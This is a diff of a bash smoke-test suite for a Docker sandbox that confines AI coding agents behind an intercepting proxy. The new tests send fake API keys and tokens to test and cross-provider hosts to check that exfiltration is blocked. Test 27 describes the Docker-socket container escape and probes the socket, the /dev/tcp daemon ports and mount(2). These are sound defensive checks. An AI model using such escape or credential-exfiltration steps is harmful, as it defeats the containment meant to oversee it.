@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# smoke tests for sandboxed-copilot
+# smoke tests for sandbox
 #
 # Tests:
 #   1. Both Docker images build successfully
@@ -9,9 +9,9 @@
 #   5. Proxy blocks connections to non-allowlisted domains (example.com)
 #   6. Direct internet bypass is impossible (no route around the proxy)
 #   7. Allowlist live-reload: a newly added domain becomes reachable within 10s
-#   8. copilot-cli binary is present in the image
+#   8. Both agent CLIs are present and runnable in the image
 #   9. Home directory files are owned by root
-#  10. TLS inspection (ssl_bump): CA cert is installed in the copilot trust store
+#  10. TLS inspection (ssl_bump): CA cert is installed in the agent trust store
 #  11. TLS inspection (ssl_bump): HTTPS succeeds with HTTP 200 AND cert is signed by CA
 #  12. Auth status detection handles missing token gracefully
 #  13. proxy denied lists blocked domains and excludes allowlisted ones
@@ -21,6 +21,12 @@
 #  20. SANDBOX_VARIANT env var is set to 'standard' in the default image
 #  21. GitHub API endpoint blocking: POST /gists is blocked by ICAP scanner
 #  22. Proxy survives a container restart and returns to healthy (stale PID regression)
+#  23. Claude API (api.anthropic.com) is reachable and intercepted by ssl_bump
+#  24. Anthropic credential exfiltration is blocked (x-api-key header)
+#  25. Cross-provider: a GitHub token sent to api.anthropic.com is blocked
+#  26. Anthropic infrastructure exemption: no false positive on Claude API calls
+#  27. Container escape via the Docker socket is not possible (no socket, no client,
+#      no TCP daemon route, no mount(2), no unexpected bind mounts)
 #
 # Usage:
 #   bash test/smoke.sh            # from project root
@@ -37,11 +43,11 @@ ALLOWLIST="${PROJECT_DIR}/config/allowlist.txt"
 # This ensures the test's docker compose project name matches what the launcher
 # would derive when run from PROJECT_DIR, so proxy denied can find the right container.
 _test_hash=$(printf '%s' "$PROJECT_DIR" | cksum | awk '{printf "%08d", $1}')
-TEST_PROJECT_NAME="sandboxed-copilot-${_test_hash}"
+TEST_PROJECT_NAME="sandbox-${_test_hash}"
 export PROJECT_ALLOWLIST_FILE="project-allowlist-${_test_hash}.txt"
-export COPILOT_WORKSPACE="${PROJECT_DIR}"
+export SANDBOX_WORKSPACE="${PROJECT_DIR}"
 # Use the standard variant explicitly so smoke tests always run against a known image.
-export COPILOT_IMAGE="sandboxed-copilot-standard"
+export SANDBOX_IMAGE="sandbox-standard"
 
 COMPOSE="docker compose -f ${COMPOSE_FILE} --project-directory ${PROJECT_DIR} --project-name ${TEST_PROJECT_NAME}"
 
@@ -54,15 +60,15 @@ declare -a ERRORS=()
 pass() { echo "  ✓ $*"; PASS=$((PASS + 1)); }
 fail() { echo "  ✗ $*"; FAIL=$((FAIL + 1)); ERRORS+=("$*"); }
 
-# Run a command inside the copilot container without starting the proxy.
+# Run a command inside the agent container without starting the proxy.
 # Use for tests that don't need network access.
 run_offline() {
-    $COMPOSE run --rm --no-deps copilot bash -c "$1" 2>/dev/null
+    $COMPOSE run --rm --no-deps agent bash -c "$1" 2>/dev/null
 }
 
-# Run a command inside the copilot container with the proxy active.
+# Run a command inside the agent container with the proxy active.
 run_online() {
-    $COMPOSE run --rm copilot bash -c "$1" 2>/dev/null
+    $COMPOSE run --rm agent bash -c "$1" 2>/dev/null
 }
 
 cleanup() {
@@ -148,7 +154,7 @@ if [ "$_need_ca" = true ]; then
         exit 1
     fi
     if openssl req -new -newkey rsa:2048 -days 1 -nodes -x509 \
-        -subj "/CN=sandboxed-copilot test CA/O=sandboxed-copilot" \
+        -subj "/CN=sandbox test CA/O=sandbox" \
         -addext "basicConstraints=critical,CA:TRUE" \
         -addext "keyUsage=critical,keyCertSign,cRLSign" \
         -keyout "${PROJECT_DIR}/config/ca.key" \
@@ -165,7 +171,7 @@ fi
 
 # ── 1. Build ─────────────────────────────────────────────────────────────────
 
-echo "=== sandboxed-copilot smoke tests ==="
+echo "=== sandbox smoke tests ==="
 echo ""
 echo "── 1. Building images..."
 
@@ -267,7 +273,7 @@ fi
 echo ""
 echo "── 6. Direct internet bypass blocked..."
 # --noproxy '*' tells curl to ignore HTTP_PROXY / HTTPS_PROXY.
-# The copilot container is on an internal-only Docker network so direct
+# The agent container is on an internal-only Docker network so direct
 # connections should fail even without the proxy.
 if run_online "curl -sf --max-time 8 --noproxy '*' https://github.com -o /dev/null 2>/dev/null"; then
     fail "Direct internet access succeeded — the container has an unexpected route bypassing the proxy"
@@ -302,19 +308,51 @@ printf '%s\n' "$ALLOWLIST_BACKUP" > "$ALLOWLIST"
 
 echo ""
 
-# ── 8. Copilot CLI binary present in image ────────────────────────────────────
-# The copilot-cli binary is baked into the Docker image at build time, so it
-# must be present and executable without any network access or volume mounting.
-# `gh copilot` (built-in) looks for this binary at this exact path.
+# ── 8. Agent CLIs present in image ────────────────────────────────────────────
+# Both agent CLIs are baked into the Docker image at build time, so they must be
+# present and runnable without any network access or volume mounting.
 
-echo "── 8. Verifying copilot-cli binary is baked into the image..."
+echo "── 8. Verifying both agent CLIs are baked into the image..."
 
-COPILOT_BIN="/home/copilot/.local/share/gh/copilot/copilot"
+# `gh copilot` (built-in) looks for the copilot binary at this exact path, and
+# the Dockerfile symlinks it onto PATH so `sandbox copilot` can launch it.
+COPILOT_BIN="/home/agent/.local/share/gh/copilot/copilot"
 COPILOT_OUTPUT=$(run_offline "test -x '$COPILOT_BIN' && echo present || echo absent" 2>/dev/null | tr -d '[:space:]')
 if [ "$COPILOT_OUTPUT" = "present" ]; then
     pass "copilot-cli binary is present and executable in the image"
 else
     fail "copilot-cli binary is missing from the image (was it installed at build time?)"
+fi
+
+COPILOT_ON_PATH=$(run_offline "command -v copilot >/dev/null && echo yes || echo no" 2>/dev/null | tr -d '[:space:]')
+if [ "$COPILOT_ON_PATH" = "yes" ]; then
+    pass "copilot is on PATH"
+else
+    fail "copilot is not on PATH (the /usr/local/bin/copilot symlink is missing)"
+fi
+
+# Claude Code must actually run, not merely exist: the native installer produces
+# a versioned binary plus a symlink, and only executing it proves both are intact.
+CLAUDE_VERSION=$(run_offline "claude --version 2>/dev/null | head -1" 2>/dev/null | tr -d '[:space:]')
+if [ -n "$CLAUDE_VERSION" ]; then
+    pass "claude runs in the image (${CLAUDE_VERSION})"
+else
+    fail "claude did not run in the image (was it installed at build time?)"
+fi
+
+# CLAUDE_CONFIG_DIR keeps ~/.claude and .claude.json in one bind-mountable dir.
+CLAUDE_CFG=$(run_offline 'printf "%s" "${CLAUDE_CONFIG_DIR:-unset}"' 2>/dev/null | tr -d '[:space:]')
+if [ "$CLAUDE_CFG" = "/home/agent/.claude" ]; then
+    pass "CLAUDE_CONFIG_DIR points at /home/agent/.claude"
+else
+    fail "CLAUDE_CONFIG_DIR is '${CLAUDE_CFG}', expected /home/agent/.claude"
+fi
+
+CLAUDE_CFG_WRITABLE=$(run_offline 'touch "${CLAUDE_CONFIG_DIR}/.smoke-write-test" 2>/dev/null && echo writable || echo readonly' 2>/dev/null | tr -d '[:space:]')
+if [ "$CLAUDE_CFG_WRITABLE" = "writable" ]; then
+    pass "CLAUDE_CONFIG_DIR is writable (login and session state can persist)"
+else
+    fail "CLAUDE_CONFIG_DIR is not writable — /login would fail"
 fi
 
 echo ""
@@ -323,13 +361,13 @@ echo ""
 
 echo "── 9. Checking home directory ownership..."
 
-# All files under /home/copilot should be owned by root — the container runs
+# All files under /home/agent should be owned by root — the container runs
 # as root with cap_drop: ALL providing containment.
-NOT_ROOT_OWNED=$(run_offline "find /home/copilot -not -user root 2>/dev/null | head -5" 2>/dev/null | tr -d '[:space:]')
+NOT_ROOT_OWNED=$(run_offline "find /home/agent -not -user root 2>/dev/null | head -5" 2>/dev/null | tr -d '[:space:]')
 if [ -z "$NOT_ROOT_OWNED" ]; then
-    pass "All files in /home/copilot are owned by root"
+    pass "All files in /home/agent are owned by root"
 else
-    fail "Some files in /home/copilot are not owned by root: ${NOT_ROOT_OWNED}"
+    fail "Some files in /home/agent are not owned by root: ${NOT_ROOT_OWNED}"
 fi
 
 echo ""
@@ -342,13 +380,13 @@ echo "── 10. Testing ssl_bump CA cert trust..."
 # The entrypoint installs that mounted CA into the system trust store via update-ca-certificates.
 # After the entrypoint runs, the mounted CA should appear in the system trust store.
 CA_INSTALLED=$(run_online \
-    "test -f /etc/ssl/certs/sandboxed-copilot-ca.pem && echo installed || echo missing" \
+    "test -f /etc/ssl/certs/sandbox-ca.pem && echo installed || echo missing" \
     2>/dev/null | tr -d '[:space:]')
 
 if [ "$CA_INSTALLED" = "installed" ]; then
-    pass "ssl_bump CA cert is installed in the copilot container trust store"
+    pass "ssl_bump CA cert is installed in the agent container trust store"
 else
-    fail "ssl_bump CA cert not found in trust store (/etc/ssl/certs/sandboxed-copilot-ca.pem)"
+    fail "ssl_bump CA cert not found in trust store (/etc/ssl/certs/sandbox-ca.pem)"
 fi
 
 echo ""
@@ -357,9 +395,9 @@ echo ""
 #
 # Verify that the proxy is actually intercepting HTTPS connections, not just
 # tunnelling them. With ssl_bump active:
-#   - The copilot container sees a certificate signed by our per-install CA
+#   - The agent container sees a certificate signed by our per-install CA
 #   - curl trusts this cert (because our CA is in the system trust store)
-#   - The issuer in the certificate chain contains "sandboxed-copilot"
+#   - The issuer in the certificate chain contains "sandbox"
 #
 # This test requires the proxy to be running and ssl_bump to be operational.
 # It will fail if Squid fell back to CONNECT tunnelling or if the sslcrtd
@@ -372,7 +410,7 @@ echo "── 11. Testing ssl_bump TLS interception..."
 #      is installed and trusted. Would fail with exit 60 (SSL verify error) if
 #      the CA cert was not in the trust store (caught the update-ca-certificates
 #      -q bug that caused silent install failure).
-#   b) The certificate issuer contains "sandboxed-copilot" — confirms the proxy
+#   b) The certificate issuer contains "sandbox" — confirms the proxy
 #      is actively intercepting (ssl_bump), not just tunnelling (CONNECT).
 #      Would fail if sslcrtd crashed and Squid fell back to tunnel mode
 #      (caught the ssl_db EEXIST bug that silently killed sslcrtd).
@@ -380,11 +418,11 @@ echo "── 11. Testing ssl_bump TLS interception..."
 # Using github.com (same domain as test 4) for consistency and reliability.
 
 if TLS_INFO=$(run_online "curl -sv --max-time 15 https://github.com -o /dev/null 2>&1" 2>/dev/null); then
-    if echo "$TLS_INFO" | grep -qi "issuer.*sandboxed-copilot"; then
-        pass "ssl_bump e2e: HTTPS succeeds and certificate is issued by sandboxed-copilot CA"
+    if echo "$TLS_INFO" | grep -qi "issuer.*sandbox"; then
+        pass "ssl_bump e2e: HTTPS succeeds and certificate is issued by sandbox CA"
     else
         ISSUER_LINE=$(echo "$TLS_INFO" | grep -i "issuer" | head -1)
-        fail "ssl_bump e2e: HTTPS succeeded but issuer is NOT sandboxed-copilot CA: '${ISSUER_LINE:-no issuer line found}'"
+        fail "ssl_bump e2e: HTTPS succeeded but issuer is NOT sandbox CA: '${ISSUER_LINE:-no issuer line found}'"
     fi
 else
     CURL_ERR=$(echo "$TLS_INFO" | grep -i "curl:" | head -1)
@@ -401,7 +439,7 @@ echo "── 12. Testing auth status detection..."
 # When GITHUB_TOKEN is empty, the entrypoint should fall back to "Not authenticated".
 AUTH_OFFLINE=$($COMPOSE run --rm --no-deps \
     -e GITHUB_TOKEN="" \
-    copilot bash -c \
+    agent bash -c \
     'gh_login=$(GITHUB_TOKEN="" gh api /user --jq .login 2>/dev/null || true)
      if [ -n "$gh_login" ]; then echo "authenticated:$gh_login"; else echo "not_authenticated"; fi' \
     2>/dev/null | tr -d '[:space:]')
@@ -439,11 +477,11 @@ run_online "curl -sf --max-time 5 https://blocked-domain-for-test.example.com -o
 sleep 2
 
 # Call the launcher with the test project's workspace so the hash-derived project
-# name matches the test project. SANDBOXED_COPILOT_DIR points at the repo root
+# name matches the test project. SANDBOX_DIR points at the repo root
 # (which doubles as the install dir for tests).
 DENIED_OUTPUT=$(cd "$PROJECT_DIR" && \
-    SANDBOXED_COPILOT_DIR="$PROJECT_DIR" \
-    bash "$PROJECT_DIR/sandboxed-copilot" proxy denied --all 2>/dev/null || true)
+    SANDBOX_DIR="$PROJECT_DIR" \
+    bash "$PROJECT_DIR/sandbox" proxy denied --all 2>/dev/null || true)
 
 if echo "$DENIED_OUTPUT" | grep -q "blocked-domain-for-test.example.com"; then
     pass "proxy denied lists domains blocked by the proxy"
@@ -858,6 +896,217 @@ else
     else
         fail "Proxy restart regression: proxy did not return to healthy after docker restart — stale PID bug may still be present"
     fi
+fi
+
+echo ""
+
+# ── 23. Claude API reachable through the proxy ────────────────────────────────
+#
+# api.anthropic.com ships in the default allowlist because Claude Code cannot
+# function without it. This verifies it is reachable AND intercepted by ssl_bump
+# (same two assertions as test 11, applied to the Anthropic endpoint): if TLS
+# interception failed for this host, Claude Code would fail to start.
+#
+# No credentials are involved. An unauthenticated request returns HTTP 401 from
+# Anthropic, which is a successful round trip for our purposes — we assert on the
+# certificate issuer, not the response status.
+
+echo "── 23. Testing Claude API reachability and TLS interception..."
+
+if ANTHROPIC_TLS=$(run_online "curl -sv --max-time 15 https://api.anthropic.com/v1/models -o /dev/null 2>&1" 2>/dev/null); then
+    if echo "$ANTHROPIC_TLS" | grep -qi "issuer.*sandbox"; then
+        pass "Claude API: api.anthropic.com reachable and intercepted by sandbox CA"
+    else
+        ISSUER_LINE=$(echo "$ANTHROPIC_TLS" | grep -i "issuer" | head -1)
+        fail "Claude API: reachable but issuer is NOT sandbox CA: '${ISSUER_LINE:-no issuer line found}'"
+    fi
+else
+    # curl -sv returns non-zero on HTTP 401 only with -f; without it a 401 still
+    # exits 0. A non-zero exit here means the connection itself failed.
+    CURL_ERR=$(echo "$ANTHROPIC_TLS" | grep -i "curl:" | head -1)
+    fail "Claude API: connection to api.anthropic.com failed: '${CURL_ERR:-no curl error line}'"
+fi
+
+echo ""
+
+# ── 24. Anthropic credential exfiltration — header detection ─────────────────
+#
+# Same shape as test 15, for the other credential type: an Anthropic-format key
+# sent to a non-Anthropic destination must be blocked even when that destination
+# is allowlisted. The fake key uses the real sk-ant-api03- prefix so it matches
+# the detection pattern, with filler that will never authenticate anywhere.
+
+echo "── 24. Testing Anthropic credential exfiltration header detection..."
+
+FAKE_ANTHROPIC_KEY="sk-ant-api03-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+
+echo "${EXFIL_TEST_DOMAIN}" >> "${PROJECT_DIR}/config/${PROJECT_ALLOWLIST_FILE}"
+sleep 3
+
+if [ -z "${PROXY_CID:-}" ]; then
+    PROXY_CID=$($COMPOSE ps -q proxy 2>/dev/null | head -1 | tr -d '[:space:]')
+fi
+
+ANTHROPIC_EXFIL_BASELINE=$(docker exec "$PROXY_CID" \
+    sh -c "grep -c '${EXFIL_TEST_DOMAIN}' /var/log/squid/exfil.log 2>/dev/null; true")
+
+# x-api-key is the header Claude Code actually sends, so test that path.
+run_online "curl -sf --max-time 5 \
+    -H 'x-api-key: ${FAKE_ANTHROPIC_KEY}' \
+    https://${EXFIL_TEST_DOMAIN}/ -o /dev/null 2>/dev/null" || true
+sleep 2
+
+ANTHROPIC_EXFIL_AFTER=$(docker exec "$PROXY_CID" \
+    sh -c "grep -c '${EXFIL_TEST_DOMAIN}' /var/log/squid/exfil.log 2>/dev/null; true")
+
+if [ "${ANTHROPIC_EXFIL_AFTER:-0}" -gt "${ANTHROPIC_EXFIL_BASELINE:-0}" ]; then
+    pass "Anthropic credential exfiltration (header): blocked and recorded in exfil.log"
+else
+    fail "Anthropic credential exfiltration (header): expected a new exfil.log entry for ${EXFIL_TEST_DOMAIN}, got none"
+fi
+
+ALLOWLIST_TMP=$(mktemp)
+grep -v "^${EXFIL_TEST_DOMAIN}$" "${PROJECT_DIR}/config/${PROJECT_ALLOWLIST_FILE}" > "$ALLOWLIST_TMP" || true
+mv "$ALLOWLIST_TMP" "${PROJECT_DIR}/config/${PROJECT_ALLOWLIST_FILE}"
+
+echo ""
+
+# ── 25. Cross-provider credential blocking ───────────────────────────────────
+#
+# Each credential may only travel to its own provider. A GitHub token sent to
+# api.anthropic.com is exfiltration even though both hosts are allowlisted and
+# api.anthropic.com is exempt from ICAP *body* scanning — the header ACL still
+# applies, which is what this test proves.
+
+echo "── 25. Testing cross-provider credential blocking..."
+
+CROSS_BASELINE=$(docker exec "$PROXY_CID" \
+    sh -c "grep -c 'anthropic' /var/log/squid/exfil.log 2>/dev/null; true")
+
+run_online "curl -sf --max-time 10 \
+    -H 'Authorization: token ${FAKE_TOKEN}' \
+    https://api.anthropic.com/v1/models -o /dev/null 2>/dev/null" || true
+sleep 2
+
+CROSS_AFTER=$(docker exec "$PROXY_CID" \
+    sh -c "grep -c 'anthropic' /var/log/squid/exfil.log 2>/dev/null; true")
+
+if [ "${CROSS_AFTER:-0}" -gt "${CROSS_BASELINE:-0}" ]; then
+    pass "Cross-provider: GitHub token to api.anthropic.com blocked and recorded"
+else
+    fail "Cross-provider: GitHub token to api.anthropic.com was not recorded in exfil.log"
+fi
+
+echo ""
+
+# ── 26. Anthropic infrastructure exemption ───────────────────────────────────
+#
+# The mirror of test 17: an Anthropic key sent to Anthropic's own API is
+# legitimate and must not be flagged. Without this exemption every Claude Code
+# request would be logged as exfiltration.
+
+echo "── 26. Testing Anthropic infrastructure exemption (no false positive)..."
+
+ANTHROPIC_INFRA_BASELINE=$(docker exec "$PROXY_CID" \
+    sh -c "wc -l < /var/log/squid/exfil.log 2>/dev/null || echo 0" | tr -d '[:space:]')
+
+run_online "curl -sf --max-time 10 \
+    -H 'x-api-key: ${FAKE_ANTHROPIC_KEY}' \
+    https://api.anthropic.com/v1/models -o /dev/null 2>/dev/null" || true
+sleep 2
+
+ANTHROPIC_INFRA_AFTER=$(docker exec "$PROXY_CID" \
+    sh -c "wc -l < /var/log/squid/exfil.log 2>/dev/null || echo 0" | tr -d '[:space:]')
+
+if [ "${ANTHROPIC_INFRA_AFTER}" -le "${ANTHROPIC_INFRA_BASELINE}" ]; then
+    pass "Anthropic infra exemption: key to api.anthropic.com not recorded in exfil.log"
+else
+    NEW_ENTRIES=$(docker exec "$PROXY_CID" \
+        tail -n "$((ANTHROPIC_INFRA_AFTER - ANTHROPIC_INFRA_BASELINE))" /var/log/squid/exfil.log 2>/dev/null || echo "")
+    if echo "$NEW_ENTRIES" | grep -q "anthropic"; then
+        fail "Anthropic infra exemption: exfil.log gained anthropic entries (false positive)"
+    else
+        pass "Anthropic infra exemption: new exfil.log entries are unrelated to anthropic"
+    fi
+fi
+
+echo ""
+
+# ── 27. Container escape via the Docker socket ───────────────────────────────
+#
+# The classic escape from an agent container is to talk to the host's Docker
+# daemon and start a second container with a host path bind-mounted:
+#
+#     docker run -v /Users/someone:/mnt debian ls /mnt
+#
+# That sidesteps every boundary in this design — the workspace bind-mount, the
+# proxy, cap_drop — because the *host* daemon does the mounting, not us. The
+# defence is simply that the agent container has no way to reach the daemon:
+# no socket mounted, no client installed, no route to a TCP daemon. This test
+# asserts all three, plus that the container cannot mount host paths itself.
+
+echo "── 27. Testing Docker socket escape vector..."
+
+# a. No Docker socket is mounted anywhere the agent can see it.
+DOCKER_SOCKETS=$(run_offline "ls /var/run/docker.sock /run/docker.sock /var/run/docker/docker.sock 2>/dev/null" | tr -d '[:space:]')
+if [ -z "$DOCKER_SOCKETS" ]; then
+    pass "No Docker socket present in the agent container"
+else
+    fail "Docker socket is reachable from the agent container: ${DOCKER_SOCKETS}"
+fi
+
+# b. No Docker client is installed — nothing to drive a daemon with.
+DOCKER_CLI=$(run_offline "command -v docker dockerd podman nerdctl 2>/dev/null" | tr -d '[:space:]')
+if [ -z "$DOCKER_CLI" ]; then
+    pass "No container client (docker/podman/nerdctl) on PATH"
+else
+    fail "A container client is installed in the agent image: ${DOCKER_CLI}"
+fi
+
+# c. A raw HTTP call to the daemon socket fails — covers the case where the
+#    socket exists under a path we did not think to check in (a).
+DAEMON_PING=$(run_offline "curl -s --max-time 5 --unix-socket /var/run/docker.sock http://localhost/version 2>&1; echo EXIT=\$?" | tail -1 | tr -d '[:space:]')
+if [ "$DAEMON_PING" != "EXIT=0" ]; then
+    pass "Docker daemon API is not reachable over a unix socket (${DAEMON_PING})"
+else
+    fail "Docker daemon API responded over /var/run/docker.sock — escape possible"
+fi
+
+# d. No route to a TCP-exposed daemon on the host. The agent is on an
+#    internal-only network, so host.docker.internal should not resolve or
+#    connect on either of the conventional daemon ports.
+TCP_DAEMON=""
+for port in 2375 2376; do
+    if run_offline "timeout 5 bash -c '</dev/tcp/host.docker.internal/${port}' 2>/dev/null && echo OPEN" | grep -q OPEN; then
+        TCP_DAEMON="${TCP_DAEMON} ${port}"
+    fi
+done
+if [ -z "$TCP_DAEMON" ]; then
+    pass "No route to a TCP Docker daemon on the host (ports 2375, 2376)"
+else
+    fail "Host Docker daemon reachable over TCP on port(s):${TCP_DAEMON}"
+fi
+
+# e. The container cannot mount host paths itself. cap_drop: ALL removes
+#    CAP_SYS_ADMIN, so mount(2) fails even as root. Test 3 asserts the
+#    capability bits are zero; this asserts the behaviour they produce.
+MOUNT_RESULT=$(run_offline "mkdir -p /mnt/escape && mount --bind /etc /mnt/escape 2>&1; echo EXIT=\$?" | tail -1 | tr -d '[:space:]')
+if [ "$MOUNT_RESULT" != "EXIT=0" ]; then
+    pass "Bind-mounting inside the container is refused (${MOUNT_RESULT})"
+else
+    fail "mount --bind succeeded inside the container — cap_drop: ALL is not in effect"
+fi
+
+# f. Only the expected bind mounts are visible. Anything else means a host
+#    path has been exposed to the agent that the threat model does not cover.
+UNEXPECTED_MOUNTS=$(run_offline "awk '{print \$5}' /proc/self/mountinfo \
+    | grep -vE '^/(proc|sys|dev)(/|\$)' \
+    | grep -vxE '/|/workspace|/tmp|/home/agent/.shell_history|/etc/squid/ca/ca.crt|/etc/sandbox/package-cooldown|/etc/resolv.conf|/etc/hostname|/etc/hosts' \
+    | sort -u | tr '\n' ' '" | tr -s '[:space:]' ' ' | sed 's/^ *//;s/ *$//')
+if [ -z "$UNEXPECTED_MOUNTS" ]; then
+    pass "Only the expected bind mounts are visible to the agent"
+else
+    fail "Unexpected mounts visible in the agent container: ${UNEXPECTED_MOUNTS}"
 fi
 
 echo ""
